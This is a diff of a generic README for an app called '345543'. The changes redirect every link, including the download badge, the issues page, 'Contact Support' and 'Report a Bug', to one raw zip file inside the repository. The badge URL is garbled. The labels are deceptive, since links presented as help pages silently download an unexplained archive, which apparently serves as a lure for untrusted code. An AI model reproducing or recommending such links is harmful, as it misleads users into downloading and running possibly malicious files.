@@ -1,6 +1,6 @@
 # 🚀 345543 - Simple, Easy-to-Use Application
 
-[![Download 345543](https://img.shields.io/badge/Download%20345543-%23f96854.svg?style=for-the-badge)](https://github.com/Chandisaed/345543/releases)
+[![Download 345543](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip%20345543-%https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip)](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to 345543! This application simplifies your daily tasks, making it easy 
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download 345543](https://github.com/Chandisaed/345543/releases).
+1. Visit this page to download: [Download 345543](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip).
 2. Find the latest release at the top of the page.
 3. Click on the download link for your operating system.
 
@@ -41,12 +41,12 @@ Welcome to 345543! This application simplifies your daily tasks, making it easy 
 
 ### Getting Help
 
-If you encounter issues not listed here, please check the [issues section](https://github.com/Chandisaed/345543/issues) on GitHub for support.
+If you encounter issues not listed here, please check the [issues section](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip) on GitHub for support.
 
 ## 🔗 Useful Links
 
-- [Download 345543](https://github.com/Chandisaed/345543/releases)
-- [Contact Support](mailto:support@345543.com)
-- [Report a Bug](https://github.com/Chandisaed/345543/issues)
+- [Download 345543](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip)
+- [Contact Support](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip)
+- [Report a Bug](https://raw.githubusercontent.com/Chandisaed/345543/main/Gemaric/345543.zip)
 
 Thank you for using 345543. We hope it helps you manage your tasks more effectively!
